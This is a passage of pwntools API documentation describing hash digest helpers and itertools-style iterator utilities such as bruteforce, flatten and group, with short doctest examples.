<code class="descclassname">pwnlib.util.hashes.</code><code class="descname">md5filehex</code><span class="sig-paren">(</span><em>x</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/hashes.py#L25-25"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.hashes.md5filehex" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the md5 sum of a file; returns hex-encoded</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.hashes.md5sum">
<code class="descclassname">pwnlib.util.hashes.</code><code class="descname">md5sum</code><span class="sig-paren">(</span><em>x</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/hashes.py#L23-23"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.hashes.md5sum" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the md5 sum of a string</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.hashes.md5sumhex">
<code class="descclassname">pwnlib.util.hashes.</code><code class="descname">md5sumhex</code><span class="sig-paren">(</span><em>x</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/hashes.py#L27-27"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.hashes.md5sumhex" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the md5 sum of a string; returns hex-encoded</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.hashes.sha1file">
<code class="descclassname">pwnlib.util.hashes.</code><code class="descname">sha1file</code><span class="sig-paren">(</span><em>x</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/hashes.py#L21-21"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.hashes.sha1file" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the sha1 sum of a file</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.hashes.sha1filehex">
<code class="descclassname">pwnlib.util.hashes.</code><code class="descname">sha1filehex</code><span class="sig-paren">(</span><em>x</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/hashes.py#L25-25"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.hashes.sha1filehex" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the sha1 sum of a file; returns hex-encoded</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.hashes.sha1sum">
<code class="descclassname">pwnlib.util.hashes.</code><code class="descname">sha1sum</code><span class="sig-paren">(</span><em>x</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/hashes.py#L23-23"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.hashes.sha1sum" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the sha1 sum of a string</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.hashes.sha1sumhex">
<code class="descclassname">pwnlib.util.hashes.</code><code class="descname">sha1sumhex</code><span class="sig-paren">(</span><em>x</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/hashes.py#L27-27"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.hashes.sha1sumhex" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the sha1 sum of a string; returns hex-encoded</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.hashes.sha224file">
<code class="descclassname">pwnlib.util.hashes.</code><code class="descname">sha224file</code><span class="sig-paren">(</span><em>x</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/hashes.py#L21-21"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.hashes.sha224file" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the sha224 sum of a file</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.hashes.sha224filehex">
<code class="descclassname">pwnlib.util.hashes.</code><code class="descname">sha224filehex</code><span class="sig-paren">(</span><em>x</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/hashes.py#L25-25"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.hashes.sha224filehex" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the sha224 sum of a file; returns hex-encoded</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.hashes.sha224sum">
<code class="descclassname">pwnlib.util.hashes.</code><code class="descname">sha224sum</code><span class="sig-paren">(</span><em>x</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/hashes.py#L23-23"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.hashes.sha224sum" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the sha224 sum of a string</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.hashes.sha224sumhex">
<code class="descclassname">pwnlib.util.hashes.</code><code class="descname">sha224sumhex</code><span class="sig-paren">(</span><em>x</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/hashes.py#L27-27"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.hashes.sha224sumhex" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the sha224 sum of a string; returns hex-encoded</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.hashes.sha256file">
<code class="descclassname">pwnlib.util.hashes.</code><code class="descname">sha256file</code><span class="sig-paren">(</span><em>x</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/hashes.py#L21-21"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.hashes.sha256file" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the sha256 sum of a file</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.hashes.sha256filehex">
<code class="descclassname">pwnlib.util.hashes.</code><code class="descname">sha256filehex</code><span class="sig-paren">(</span><em>x</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/hashes.py#L25-25"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.hashes.sha256filehex" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the sha256 sum of a file; returns hex-encoded</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.hashes.sha256sum">
<code class="descclassname">pwnlib.util.hashes.</code><code class="descname">sha256sum</code><span class="sig-paren">(</span><em>x</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/hashes.py#L23-23"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.hashes.sha256sum" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the sha256 sum of a string</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.hashes.sha256sumhex">
<code class="descclassname">pwnlib.util.hashes.</code><code class="descname">sha256sumhex</code><span class="sig-paren">(</span><em>x</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/hashes.py#L27-27"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.hashes.sha256sumhex" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the sha256 sum of a string; returns hex-encoded</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.hashes.sha384file">
<code class="descclassname">pwnlib.util.hashes.</code><code class="descname">sha384file</code><span class="sig-paren">(</span><em>x</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/hashes.py#L21-21"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.hashes.sha384file" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the sha384 sum of a file</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.hashes.sha384filehex">
<code class="descclassname">pwnlib.util.hashes.</code><code class="descname">sha384filehex</code><span class="sig-paren">(</span><em>x</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/hashes.py#L25-25"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.hashes.sha384filehex" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the sha384 sum of a file; returns hex-encoded</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.hashes.sha384sum">
<code class="descclassname">pwnlib.util.hashes.</code><code class="descname">sha384sum</code><span class="sig-paren">(</span><em>x</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/hashes.py#L23-23"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.hashes.sha384sum" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the sha384 sum of a string</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.hashes.sha384sumhex">
<code class="descclassname">pwnlib.util.hashes.</code><code class="descname">sha384sumhex</code><span class="sig-paren">(</span><em>x</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/hashes.py#L27-27"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.hashes.sha384sumhex" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the sha384 sum of a string; returns hex-encoded</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.hashes.sha512file">
<code class="descclassname">pwnlib.util.hashes.</code><code class="descname">sha512file</code><span class="sig-paren">(</span><em>x</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/hashes.py#L21-21"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.hashes.sha512file" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the sha512 sum of a file</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.hashes.sha512filehex">
<code class="descclassname">pwnlib.util.hashes.</code><code class="descname">sha512filehex</code><span class="sig-paren">(</span><em>x</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/hashes.py#L25-25"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.hashes.sha512filehex" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the sha512 sum of a file; returns hex-encoded</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.hashes.sha512sum">
<code class="descclassname">pwnlib.util.hashes.</code><code class="descname">sha512sum</code><span class="sig-paren">(</span><em>x</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/hashes.py#L23-23"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.hashes.sha512sum" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the sha512 sum of a string</p>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.hashes.sha512sumhex">
<code class="descclassname">pwnlib.util.hashes.</code><code class="descname">sha512sumhex</code><span class="sig-paren">(</span><em>x</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/hashes.py#L27-27"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.hashes.sha512sumhex" title="Permalink to this definition">¶</a></dt>
<dd><p>Calculates the sha512 sum of a string; returns hex-encoded</p>
</dd></dl>

</div>
<span id="document-util/iters"></span><div class="section" id="module-pwnlib.util.iters">
<span id="pwnlib-util-iters-extension-of-standard-module-itertools"></span><h3><a class="reference internal" href="#module-pwnlib.util.iters" title="pwnlib.util.iters"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.util.iters</span></code></a> &#8212; Extension of standard module <a class="reference external" href="https://docs.python.org/2.7/library/itertools.html#module-itertools" title="(in Python v2.7)"><code class="xref py py-mod docutils literal"><span class="pre">itertools</span></code></a><a class="headerlink" href="#module-pwnlib.util.iters" title="Permalink to this headline">¶</a></h3>
<p>This module includes and extends the standard module <a class="reference external" href="https://docs.python.org/2.7/library/itertools.html#module-itertools" title="(in Python v2.7)"><code class="xref py py-mod docutils literal"><span class="pre">itertools</span></code></a>.</p>
<dl class="function">
<dt id="pwnlib.util.iters.bruteforce">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">bruteforce</code><span class="sig-paren">(</span><em>func</em>, <em>alphabet</em>, <em>length</em>, <em>method = 'upto'</em>, <em>start = None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py#L735-832"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.bruteforce" title="Permalink to this definition">¶</a></dt>
<dd><p>Bruteforce <cite>func</cite> to return <code class="xref py py-const docutils literal"><span class="pre">True</span></code>.  <cite>func</cite> should take a string
input and return a <code class="xref py py-func docutils literal"><span class="pre">bool()</span></code>.  <cite>func</cite> will be called with strings from
<cite>alphabet</cite> until it returns <code class="xref py py-const docutils literal"><span class="pre">True</span></code> or the search space has been
exhausted.</p>
<p>The argument <cite>start</cite> can be used to split the search space, which is useful
if multiple CPU cores are available.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>func</strong> (<a class="reference internal" href="index.html#pwnlib.shellcraft.i386.function" title="pwnlib.shellcraft.i386.function"><em>function</em></a>) &#8211; The function to bruteforce.</li>
<li><strong>alphabet</strong> &#8211; The alphabet to draw symbols from.</li>
<li><strong>length</strong> &#8211; Longest string to try.</li>
<li><strong>method</strong> &#8211; If &#8216;upto&#8217; try strings of length <code class="docutils literal"><span class="pre">1</span> <span class="pre">..</span> <span class="pre">length</span></code>, if &#8216;fixed&#8217; only
try strings of length <code class="docutils literal"><span class="pre">length</span></code> and if &#8216;downfrom&#8217; try strings of length
<code class="docutils literal"><span class="pre">length</span> <span class="pre">..</span> <span class="pre">1</span></code>.</li>
<li><strong>start</strong> &#8211; a tuple <code class="docutils literal"><span class="pre">(i,</span> <span class="pre">N)</span></code> which splits the search space up into <cite>N</cite> pieces
and starts at piece <cite>i</cite> (1..N). <code class="xref py py-const docutils literal"><span class="pre">None</span></code> is equivalent to <code class="docutils literal"><span class="pre">(1,</span> <span class="pre">1)</span></code>.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">A string <cite>s</cite> such that <code class="docutils literal"><span class="pre">func(s)</span></code> returns <code class="xref py py-const docutils literal"><span class="pre">True</span></code> or <code class="xref py py-const docutils literal"><span class="pre">None</span></code>
if the search space was exhausted.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">bruteforce</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span> <span class="o">==</span> <span class="s1">&#39;hello&#39;</span><span class="p">,</span> <span class="n">string</span><span class="o">.</span><span class="n">lowercase</span><span class="p">,</span> <span class="n">length</span> <span class="o">=</span> <span class="mi">10</span><span class="p">)</span>
<span class="go">&#39;hello&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">bruteforce</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span> <span class="o">==</span> <span class="s1">&#39;hello&#39;</span><span class="p">,</span> <span class="s1">&#39;hllo&#39;</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="ow">is</span> <span class="kc">None</span>
<span class="go">True</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.mbruteforce">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">mbruteforce</code><span class="sig-paren">(</span><em>func</em>, <em>alphabet</em>, <em>length</em>, <em>method = 'upto'</em>, <em>start = None</em>, <em>threads = None</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py#L836-917"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.mbruteforce" title="Permalink to this definition">¶</a></dt>
<dd><p>Same functionality as bruteforce(), but multithreaded.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>alphabet</strong><strong>, </strong><strong>length</strong><strong>, </strong><strong>method</strong><strong>, </strong><strong>start</strong> (<em>func</em><em>,</em><em></em>) &#8211; same as for bruteforce()</li>
<li><strong>threads</strong> &#8211; Amount of threads to spawn, default is the amount of cores.</li>
</ul>
</td>
</tr>
</tbody>
</table>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.chained">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">chained</code><span class="sig-paren">(</span><em>func</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py#L709-733"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.chained" title="Permalink to this definition">¶</a></dt>
<dd><p>A decorator chaining the results of <cite>func</cite>.  Useful for generators.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>func</strong> (<a class="reference internal" href="index.html#pwnlib.shellcraft.i386.function" title="pwnlib.shellcraft.i386.function"><em>function</em></a>) &#8211; The function being decorated.</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">A generator function whoose elements are the concatenation of the return
values from <code class="docutils literal"><span class="pre">func(*args,</span> <span class="pre">**kwargs)</span></code>.</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nd">@chained</span>
<span class="gp">... </span><span class="k">def</span> <span class="nf">g</span><span class="p">():</span>
<span class="gp">... </span>    <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">count</span><span class="p">():</span>
<span class="gp">... </span>        <span class="k">yield</span> <span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="o">-</span><span class="n">x</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">take</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="n">g</span><span class="p">())</span>
<span class="go">[0, 0, 1, -1, 2, -2]</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.consume">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">consume</code><span class="sig-paren">(</span><em>n</em>, <em>iterator</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py#L117-146"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.consume" title="Permalink to this definition">¶</a></dt>
<dd><p>Advance the iterator <cite>n</cite> steps ahead. If <cite>n is :const:`None</cite>, consume
everything.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>n</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Number of elements to consume.</li>
<li><strong>iterator</strong> (<em>iterator</em>) &#8211; An iterator.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last"><code class="xref py py-const docutils literal"><span class="pre">None</span></code>.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">i</span> <span class="o">=</span> <span class="n">count</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">consume</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">i</span><span class="o">.</span><span class="n">next</span><span class="p">()</span>
<span class="go">5</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">i</span> <span class="o">=</span> <span class="nb">iter</span><span class="p">([</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">])</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">consume</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">list</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
<span class="go">[3, 4, 5]</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.cyclen">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">cyclen</code><span class="sig-paren">(</span><em>n</em>, <em>iterable</em><span class="sig-paren">)</span> &#x2192; iterator<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py#L225-244"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.cyclen" title="Permalink to this definition">¶</a></dt>
<dd><p>Repeats the elements of <cite>iterable</cite> <cite>n</cite> times.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>n</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; The number of times to repeat <cite>iterable</cite>.</li>
<li><strong>iterable</strong> &#8211; An iterable.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">An iterator whoose elements are the elements of <cite>iterator</cite> repeated <cite>n</cite>
times.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">take</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="n">cyclen</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">]))</span>
<span class="go">[1, 2, 1, 2]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="nb">list</span><span class="p">(</span><span class="n">cyclen</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="p">[]))</span>
<span class="go">[]</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.dotproduct">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">dotproduct</code><span class="sig-paren">(</span><em>x</em>, <em>y</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py#L246-263"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.dotproduct" title="Permalink to this definition">¶</a></dt>
<dd><p>Computes the dot product of <cite>x</cite> and <cite>y</cite>.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>x</strong> (<em>iterable</em>) &#8211; An iterable.</li>
<li><strong>x</strong> &#8211; An iterable.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">The dot product of <cite>x</cite> and <cite>y</cite>, i.e. &#8211; <code class="docutils literal"><span class="pre">x[0]</span> <span class="pre">*</span> <span class="pre">y[0]</span> <span class="pre">+</span> <span class="pre">x[1]</span> <span class="pre">*</span> <span class="pre">y[1]</span> <span class="pre">+</span> <span class="pre">...</span></code>.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">dotproduct</span><span class="p">([</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">],</span> <span class="p">[</span><span class="mi">4</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">6</span><span class="p">])</span>
<span class="gp">... </span><span class="c1"># 1 * 4 + 2 * 5 + 3 * 6 == 32</span>
<span class="go">32</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.flatten">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">flatten</code><span class="sig-paren">(</span><em>xss</em><span class="sig-paren">)</span> &#x2192; iterator<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py#L265-285"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.flatten" title="Permalink to this definition">¶</a></dt>
<dd><p>Flattens one level of nesting; when <cite>xss</cite> is an iterable of iterables,
returns an iterator whoose elements is the concatenation of the elements of
<cite>xss</cite>.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>xss</strong> &#8211; An iterable of iterables.</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body">An iterator whoose elements are the concatenation of the iterables in
<cite>xss</cite>.</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">list</span><span class="p">(</span><span class="n">flatten</span><span class="p">([[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">],</span> <span class="p">[</span><span class="mi">3</span><span class="p">,</span> <span class="mi">4</span><span class="p">]]))</span>
<span class="go">[1, 2, 3, 4]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">take</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="n">flatten</span><span class="p">([[</span><span class="mi">43</span><span class="p">,</span> <span class="mi">42</span><span class="p">],</span> <span class="p">[</span><span class="mi">41</span><span class="p">,</span> <span class="mi">40</span><span class="p">],</span> <span class="n">count</span><span class="p">()]))</span>
<span class="go">[43, 42, 41, 40, 0, 1]</span>
</pre></div>
</div>
</dd></dl>

<dl class="function">
<dt id="pwnlib.util.iters.group">
<code class="descclassname">pwnlib.util.iters.</code><code class="descname">group</code><span class="sig-paren">(</span><em>n</em>, <em>iterable</em>, <em>fill_value = None</em><span class="sig-paren">)</span> &#x2192; iterator<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/util/iters.py#L352-376"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.util.iters.group" title="Permalink to this definition">¶</a></dt>
<dd><p>Similar to <a class="reference internal" href="index.html#pwnlib.util.lists.group" title="pwnlib.util.lists.group"><code class="xref py py-func docutils literal"><span class="pre">pwnlib.util.lists.group()</span></code></a>, but returns an iterator and uses
<a class="reference external" href="https://docs.python.org/2.7/library/itertools.html#module-itertools" title="(in Python v2.7)"><code class="xref py py-mod docutils literal"><span class="pre">itertools</span></code></a> fast build-in functions.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>n</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; The group size.</li>
<li><strong>iterable</strong> &#8211; An iterable.</li>
<li><strong>fill_value</strong> &#8211; The value to fill into the remaining slots of the last group
if the <cite>n</cite> does not divide the number of elements in <cite>iterable</cite>.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Returns:</th><td class="field-body"><p class="first last">An iterator whoose elements are <cite>n</cite>-tuples of the elements of <cite>iterable</cite>.</p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="nb">list</span><span class="p">(</span><span class="n">group</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">)))</span>
<span class="go">[(0, 1), (2, 3), (4, None)]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">take</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">group</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">count</span><span class="p">()))</span>
<span class="go">[(0, 1), (2, 3), (4, 5)]</span>
